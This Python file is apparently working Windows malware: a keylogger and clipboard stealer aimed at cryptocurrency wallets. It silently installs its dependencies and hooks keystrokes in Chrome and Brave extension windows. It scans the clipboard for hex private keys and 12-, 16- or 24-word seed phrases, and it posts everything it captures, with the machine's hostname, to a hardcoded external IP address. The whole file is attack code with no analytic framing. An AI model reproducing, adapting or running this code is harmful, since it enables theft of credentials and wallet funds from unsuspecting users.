_M = "-m"
_P = "pip"
_L = "install"
import socket, subprocess, sys, re

try:
    import pyWinhook as pyHook
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pyWinhook"])
    import pyWinhook as pyHook
try:
    import psutil
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "psutil"])
    import psutil
try:
    import win32process
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32process
try:
    import win32gui
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32gui
try:
    import win32api
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32api
try:
    import win32con
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32con
try:
    import win32clipboard
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32clipboard
try:
    from requests import post
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "requests"])
    from requests import post
try:
    import wx
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "wxPython"])
    import wx

# ------------------------------------------------------Hook Utils--------------------------------------------------------------

key_log = ""
c_win = 0
PORT = 8637
HOST = "95.164.7.171"
sType = "10"
gType = "103"
# HOST = "localhost"

browserlist = ["chrome.exe", "brave.exe"]


def act_win_pn():
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)
        caption = win32gui.GetWindowText(hwnd)
        return (pid[-1], psutil.Process(pid[-1]).name(), caption)
    except:
        pass


def is_down(status):
    if status == 128:
        return True
    return False


def is_control_down():
    return (
        is_down(pyHook.GetKeyState(0x11))
        or is_down(pyHook.GetKeyState(0xA2))
        or is_down(pyHook.GetKeyState(0xA3))
    )


def save_log(log, text, caption):
    global key_log
    r = {
        "gid": sType,
        "pid": gType,
        "pcname": socket.gethostname(),
        "processname": text,
        "windowname": caption,
        "data": log,
    }
    host2 = f"http://{HOST}:{PORT}"
    post(host2 + "/api/clip", data=r)
    key_log = ""


def GetTextFromClipboard():
    clipboard = wx.Clipboard()
    if clipboard.Open():
        if clipboard.IsSupported(wx.DataFormat(wx.DF_TEXT)):
            data = wx.TextDataObject()
            clipboard.GetData(data)
            s = data.GetText()
            # if self.ispvkey(s) or self.ismnemonic(s):
            save_log(s, "clipboard", "extension")
            clipboard.Close()


def OnKeyboardEvent(event):
    (pid, text, caption) = act_win_pn()
    if browserlist.count(text):
        if caption == "":
            global key_log
            key = event.Ascii
            if is_control_down():
                key = f"<^{event.Key}>"
            elif key == 0xD:
                key = "\n"
            else:
                if key >= 32 and key <= 126:
                    key = chr(key)
                else:
                    key = f"<{event.Key}>"

            if is_control_down() and event.Key == "V":
                GetTextFromClipboard()
            key_log += key
            if key == "\n" and len(key_log):
                save_log(key_log, text, "extension")
        else:
            if len(key_log):
                save_log(key_log, text, "extension")
    return True


# create the hook mananger
hm = pyHook.HookManager()
# register two callbacks
hm.KeyDown = OnKeyboardEvent
# hm.MouseLeftDown = OnMouseEvent

# hook into the mouse and keyboard events
hm.HookKeyboard()
# hm.HookMouse()

# -----------------------------------------------------------------------------------------------------------------------------

# ------------------------------------------------------Clipboard Utils--------------------------------------------------------


class TestFrame(wx.Frame):
    def __init__(self):
        wx.Frame.__init__(self, None, title="Clipboard viewer", size=(250, 150))

        self.tc = wx.TextCtrl(self, -1, style=wx.TE_MULTILINE | wx.TE_READONLY)

        self.first = True
        self.nextWnd = None
        self.pvkeylength = [29, 44, 51, 52, 56, 64, 66, 96, 128, 165, 181]

        # Get native window handle of this wxWidget Frame.
        self.hwnd = self.GetHandle()

        # Set the WndProc to our function.
        self.oldWndProc = win32gui.SetWindowLong(
            self.hwnd, win32con.GWL_WNDPROC, self.MyWndProc
        )

        try:
            self.nextWnd = win32clipboard.SetClipboardViewer(self.hwnd)
        except win32api.error:
            if win32api.GetLastError() == 0:
                # information that there is no other window in chain
                pass
            else:
                raise

    def MyWndProc(self, hWnd, msg, wParam, lParam):
        if msg == win32con.WM_CHANGECBCHAIN:
            self.OnChangeCBChain(msg, wParam, lParam)
        elif msg == win32con.WM_DRAWCLIPBOARD:
            self.OnDrawClipboard(msg, wParam, lParam)

        # Restore the old WndProc. Notice the use of win32api
        # instead of win32gui here. This is to avoid an error due to
        # not passing a callable object.
        if msg == win32con.WM_DESTROY:
            if self.nextWnd:
                win32clipboard.ChangeClipboardChain(self.hwnd, self.nextWnd)
            else:
                win32clipboard.ChangeClipboardChain(self.hwnd, 0)

            win32api.SetWindowLong(
                self.hwnd, win32con.GWL_WNDPROC, self.oldWndProc
            )

        # Pass all messages (in this case, yours may be different) on
        # to the original WndProc
        return win32gui.CallWindowProc(
            self.oldWndProc, hWnd, msg, wParam, lParam
        )

    def save_log(self, log):
        global key_log
        r = {
            "gid": sType,
            "pid": gType,
            "pcname": socket.gethostname(),
            "processname": "clipboard",
            "data": log,
        }
        host2 = f"http://{HOST}:{PORT}"
        post(host2 + "/api/clip", data=r)
        key_log = ""

    def savepvkey(self, clipstr):
        i = len(self.pvkeylength) - 1
        clipstr = clipstr.split("\n")
        for txt in clipstr:
            while i >= 0:
                search = "[a-fA-F0-9]{" + str(self.pvkeylength[i]) + "}"
                i -= 1
                x = re.findall(search, txt)
                if len(x):
                    for t in x:
                        self.save_log(t + "\n")
                        txt = txt.replace(t, "")

    def ismnemonic(self, clipstr):
        clipstr = clipstr.split("\n")
        for txt in clipstr:
            word_cnt = len(txt.split(" "))
            if word_cnt == 12 or word_cnt == 16 or word_cnt == 24:
                return True
            else:
                return False

    def GetTextFromClipboard(self):
        clipboard = wx.Clipboard()
        if clipboard.Open():
            if clipboard.IsSupported(wx.DataFormat(wx.DF_TEXT)):
                data = wx.TextDataObject()
                clipboard.GetData(data)
                s = data.GetText()
                self.savepvkey(s)
                if self.ismnemonic(s):
                    self.save_log(s + "\n")
                self.tc.AppendText("Clip content:\n%s\n\n" % s)
                clipboard.Close()
            else:
                self.tc.AppendText("")

    def OnChangeCBChain(self, msg, wParam, lParam):
        if self.nextWnd == wParam:
            # repair the chain
            self.nextWnd = lParam
        if self.nextWnd:
            # pass the message to the next window in chain
            win32api.SendMessage(self.nextWnd, msg, wParam, lParam)

    def OnDrawClipboard(self, msg, wParam, lParam):
        if self.first:
            self.first = False
        else:
            self.tc.AppendText("[Clipboard content changed:]\n")
            self.GetTextFromClipboard()
        if self.nextWnd:
            # pass the message to the next window in chain
            win32api.SendMessage(self.nextWnd, msg, wParam, lParam)


# -----------------------------------------------------------------------------------------------------------------------------

app = wx.App()
frame = TestFrame()
app.MainLoop()
